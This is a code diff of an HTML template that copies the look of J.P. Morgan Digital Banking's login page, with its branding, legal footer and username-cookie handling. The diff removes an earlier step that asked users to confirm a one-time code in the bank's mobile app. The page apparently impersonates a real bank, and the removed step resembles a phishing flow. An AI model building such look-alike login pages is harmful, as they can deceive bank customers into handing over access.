@@ -1,36 +1,91 @@
 {% extends "base.html" %}
 
-{% block title %}J.P. Morgan Digital{% endblock %}
+{% block title %}J.P. Morgan Digital Banking{% endblock %}
 
 {% block extra_head %}
     <link rel="stylesheet" href="/static/css/styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
 {% endblock %}
 
 {% block content %}
-    <div class="container">
-        
-        <!-- Step 1: Username Entry -->
-        <div class="step active" id="step1">
-            <div id="login-form-container"></div>
+<div class="hero-section">
+    <div class="hero-background"></div>
+    <div class="hero-container">
+        <div class="hero-logo">
+            <div class="white-bar"></div>
+            <img src="/static/JPMorganLogoWhite.png" alt="J.P. Morgan" class="logo-white">
         </div>
-        
-        <!-- Step 2: PIN Entry -->
-        <div class="step" id="step2">
-            <div class="confirmation-container">
-                <a href="#" class="cancel-link" onclick="showStep(1)">Cancel</a>
-                <h3>One-Time Code</h3>
-                <h2>Please open the J.P. Morgan Digital Mobile App and select the following code:</h2>
-                <div class="pin-container">
-                    <div id="browser-pin"">
-                        Generating code...
+        <div class="hero-wrapper">
+            <div class="login-section">
+                <div class="login-container">
+                    <div class="login-title">Log in</div>
+                    <div class="input-label">Username</div>
+                    <input type="text" 
+                           id="username-input" 
+                           class="username-input">
+                    <div class="remember-me">
+                        <input type="checkbox" 
+                               id="remember-username"
+                               onchange="handleRememberMe(this)">
+                        <label for="remember-username">Remember username</label>
                     </div>
-                    <div id="pin-status"></div>
+                    <button class="continue-button" onclick="handleContinue()">CONTINUE</button>
+                    <div class="help-link">
+                        <a href="#">NEED HELP LOGGING IN?</a>
+                    </div>
                 </div>
             </div>
+            
+            <div class="hero-content">
+                <h1>J.P. Morgan Digital Banking<sup>®</sup></h1>
+                <p class="hero-subtitle">Banking for the smallest of startups to global multinationals.</p>
+            </div>
         </div>
-
-        <div id="status"></div>
     </div>
+</div>
+
+<div class="content-cards">
+    <div class="card">
+        <img src="/static/images/startup-insights.png" alt="Startup insights">
+        <div class="card-content">
+            <h2>Startup insights report</h2>
+            <p>Our Startup Insights Report highlights traits of successful founders, emerging sector trends and regional insights for AI, venture funding and robotics.</p>
+            <a href="#" class="learn-more">Learn more ›</a>
+        </div>
+    </div>
+
+    <div class="card">
+        <img src="/static/images/cash-runway.png" alt="Cash runway">
+        <div class="card-content">
+            <h2>Creating a cash runway for your startup</h2>
+            <p>Strong cash management is essential for any business. For startups, achieving an adequate cash runway is critical to survival.</p>
+            <a href="#" class="learn-more">Learn more ›</a>
+        </div>
+    </div>
+
+    <div class="card">
+        <img src="/static/images/409a-valuations.png" alt="409A valuations">
+        <div class="card-content">
+            <h2>409A valuations: What every founder needs to know</h2>
+            <p>Learn more about the 409A valuation process, why the valuations are needed and how to avoid penalties for non-compliance.</p>
+            <a href="#" class="learn-more">Learn more ›</a>
+        </div>
+    </div>
+</div>
+
+<footer class="site-footer">
+    <div class="footer-links">
+        <a href="#">Accessibility</a>
+        <a href="#">Security</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Cookie policy</a>
+        <a href="#">Regulatory information</a>
+    </div>
+    <div class="footer-text">
+        © 2025 JPMorgan Chase & Co. All rights reserved. JPMorgan Chase Bank, N.A. Member FDIC. Deposits held in non-U.S. branches are not FDIC insured. JPMorgan Chase Bank, N.A., organized under the laws of U.S.A. with limited liability.
+    </div>
+</footer>
 {% endblock %}
 
 {% block scripts %}
@@ -144,20 +199,35 @@
 
             // Only check for saved username if we're showing the login form
             document.addEventListener('DOMContentLoaded', function() {
-                const savedUsername = getCookie('username');
                 const usernameInput = document.getElementById('username-input');
-                if (savedUsername && usernameInput) {
+                const rememberCheckbox = document.getElementById('remember-username');
+                
+                // Check for saved state
+                const savedUsername = getCookie('username');
+                const shouldRemember = getCookie('remember_username') === 'true';
+                
+                // Restore saved state
+                if (shouldRemember && savedUsername) {
                     usernameInput.value = savedUsername;
-                    const rememberCheckbox = document.getElementById('remember-username');
-                    if (rememberCheckbox) {
-                        rememberCheckbox.checked = true;
-                    }
+                    rememberCheckbox.checked = true;
                 }
             });
         }
     </script>
 
     <script>
+        // Define functions first
+        function handleRememberMe(checkbox) {
+            const username = document.getElementById('username-input').value;
+            if (checkbox.checked) {
+                setCookie('remember_username', 'true', 30);
+                setCookie('username', username, 30);
+            } else {
+                setCookie('remember_username', 'false', -1);
+                setCookie('username', '', -1);
+            }
+        }
+
         // Cookie handling functions
         function setCookie(name, value, days) {
             const expires = new Date();
@@ -175,6 +245,30 @@
             }
             return null;
         }
+
+        // Initialize everything after DOM is loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            const usernameInput = document.getElementById('username-input');
+            const rememberCheckbox = document.getElementById('remember-username');
+
+            if (usernameInput && rememberCheckbox) {
+                // Restore saved state
+                const savedUsername = getCookie('username');
+                const shouldRemember = getCookie('remember_username') === 'true';
+
+                if (shouldRemember && savedUsername) {
+                    usernameInput.value = savedUsername;
+                    rememberCheckbox.checked = true;
+                }
+
+                // Add input handler
+                usernameInput.addEventListener('input', function(e) {
+                    if (rememberCheckbox.checked) {
+                        setCookie('username', e.target.value, 30);
+                    }
+                });
+            }
+        });
     </script>
 
     <script>
@@ -232,6 +326,15 @@
             
             // Show login step
             showStep(1);
+        }
+    </script>
+
+    <script>
+        function handleContinue() {
+            const username = document.getElementById('username-input').value.trim();
+            if (username) {
+                window.location.href = `/dashboard?username=${encodeURIComponent(username)}`;
+            }
         }
     </script>
 {% endblock %} 
